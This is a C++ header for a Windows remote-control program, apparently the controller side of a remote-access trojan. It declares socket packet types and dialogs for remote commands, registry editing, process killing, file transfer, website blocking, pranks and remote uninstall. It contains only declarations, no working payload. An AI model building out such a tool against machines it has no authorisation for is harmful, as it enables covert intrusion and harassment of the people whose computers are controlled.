#ifndef PROCS_H
#define PROCS_H

#define _WIN32_WINNT 0x501
#define _WIN32_IE 0x0400
#include <windows.h>
#include <commctrl.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tchar.h>
#include <string>

#include "resource.h"

#define DEF_PORT "21362"

//------------------------------
/* Dialog handle values */
#define HWND_MSG            1
#define HWND_BEEP           2
#define HWND_CMD            3
#define HWND_RUN            4
#define HWND_SDOWN          5
#define HWND_MON            6
#define HWND_REG            7
#define HWND_KEY            8
#define HWND_KILL           9
#define HWND_FILES          10
#define HWND_FUN            11
#define HWND_BLOCKWEB       12
#define HWND_VOICE          13
#define HWND_CHAT           14
#define HWND_DISP           15
#define HWND_PRINT          16
#define HWND_UNINST         50

/* Packet Header Types */
#define PACKET_RET          3997
#define PACKET_DISCONNECT   3999
#define PACKET_VERIFY       4000
#define PACKET_BEEP         4001
#define PACKET_MSG          4002
#define PACKET_MSG_RES      4222
#define PACKET_CMD          4003
#define PACKET_RUN          4004
#define PACKET_SDOWN        4005
#define PACKET_MON          4006
#define PACKET_REG          4007
#define PACKET_KEY          4008
#define PACKET_KILL         4009
#define PACKET_FUN          4010
#define PACKET_BLOCKWEB     4011
#define PACKET_VOICE        4012
#define PACKET_CHAT         4013
#define PACKET_QUIT_CHAT    4014
#define PACKET_DISP         4015
#define PACKET_PRINT        4016

#define PACKET_FILES        4032

//--------------------------
//PACKET_FUN sub-types
#define FUN_CMOUSE      6000
#define FUN__CMOUSE     6001
#define FUN_START       6002
#define FUN__START      6003
#define FUN_TASKBAR     6004
#define FUN__TASKBAR    6005
#define FUN_CDTRAY      6006
#define FUN__CDTRAY     6007
#define FUN_BLOCK       6008
#define FUN__BLOCK      6009
#define FUN_TEXT        6010
//---------------------------
//PACKET_REG sub-types
#define REG_LOADKEY     7000
#define REG_DELVALUE    7001
#define REG_EDITVALUE   7002
#define REG_DETAILS     7003
#define REG_ADDVALUE    7004
//---------------------------
//PACKET_FILES sub-types
#define FILES_DRIVES    7500
#define FILES_LIST      7501

//---------------------------

#define PACKET_UNINST       4050

//-----------------------

extern SOCKET sockConnect;
extern HWND hDialog, hStatusBar;
extern HWND hWindows[32];
extern BOOL bConnected;

typedef std::basic_string<TCHAR> ustring;

struct packet_t // packet header
{
    DWORD type;
    char data[1024];
    char buf [128];
    char buf2[128];
    char buf3[128];
    char buf4[128];
    int iBuf;
    int iBuf2;
};

struct checkbox_t
{
    HWND hWnd;
    BOOL bChecked;
};

struct regval_t
{
    unsigned int nKey;
    char szSubKey[MAX_PATH];
};

inline UINT CBAddString(const HWND hCombo, const ustring& s)
{
    return static_cast<UINT>(SendMessage(hCombo, CB_ADDSTRING, 0,
                              reinterpret_cast<LPARAM>(s.c_str())));
}

inline LRESULT LBAddString(const HWND hParent, const int id, const ustring& s)
{
    return static_cast<LRESULT>(SendDlgItemMessage(hParent, id, LB_ADDSTRING,
        0, reinterpret_cast<LPARAM>(s.c_str())));
}

inline int ErrMsg(LPCSTR msg)
{
    return MessageBox(hDialog, msg, "ERROR", MB_ICONERROR);
}

inline UINT SetStatusBar(LPCSTR lpStatus)
{
    return static_cast<UINT>(SendMessage(hStatusBar, SB_SETTEXT, 0,
                              reinterpret_cast<LPARAM>(lpStatus)));
}

void cleanup();
int download(LPCSTR lpFile);
int upload(LPCSTR lpFile);
DWORD WINAPI _retrieve_result(LPVOID lpBuffer);
BOOL CALLBACK DlgMsgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgBeepProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgCmdProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgRunProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgShutdownProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgMonitorProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgRegProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgKeyProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgKillProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgFilesProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgFunProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgBlockWebProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgVoiceProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
DWORD WINAPI _Chat(LPVOID lpBuffer);
BOOL CALLBACK DlgChatProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgDisplayProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgPrintProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK DlgUninstProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

#endif
